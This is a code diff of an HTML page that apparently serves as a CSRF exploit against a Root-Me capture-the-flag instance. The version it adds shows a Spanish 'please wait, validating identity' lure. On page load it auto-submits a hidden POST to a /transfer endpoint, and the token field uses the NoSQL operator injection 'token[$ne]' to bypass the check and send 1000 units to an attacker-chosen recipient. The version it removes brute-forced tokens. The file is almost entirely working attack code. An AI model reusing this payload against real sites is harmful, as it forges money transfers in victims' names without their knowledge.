@@ -1,32 +1,27 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Sincronización de Cuenta VIP</title>
+</head>
 <body>
-    <script>
-        const victimBase = "6594d3fb4300bf0200"; // the_dwalt00ns
-        const counters = ["000000", "000001", "000002"];
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h1>Procesando solicitud de contacto...</h1>
+        <p>Por favor, espere a que el sistema valide su identidad.</p>
+    </div>
+
+    <form id="nosql_csrf" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST">
+        <input type="hidden" name="token[$ne]" value="1" />
         
-        counters.forEach((ctr, i) => {
-            let f = document.createElement("form");
-            f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
-            f.method = "POST";
-            f.target = "_blank"; // Abrimos en pestañas nuevas para que no se pisen
+        <input type="hidden" name="recipient" value="test" />
+        
+        <input type="hidden" name="amount" value="1000" />
+    </form>
 
-            let data = {
-                "token": victimBase + ctr,
-                "recipient": "test",
-                "amount": "1000"
-            };
-
-            for (let key in data) {
-                let opt = document.createElement("input");
-                opt.type = "hidden";
-                opt.name = key;
-                opt.value = data[key];
-                f.appendChild(opt);
-            }
-            document.body.appendChild(f);
-            f.submit();
-        });
+    <script>
+        window.onload = function() {
+            // Enviamos el formulario directamente
+            document.getElementById('nosql_csrf').submit();
+        };
     </script>
 </body>
 </html>
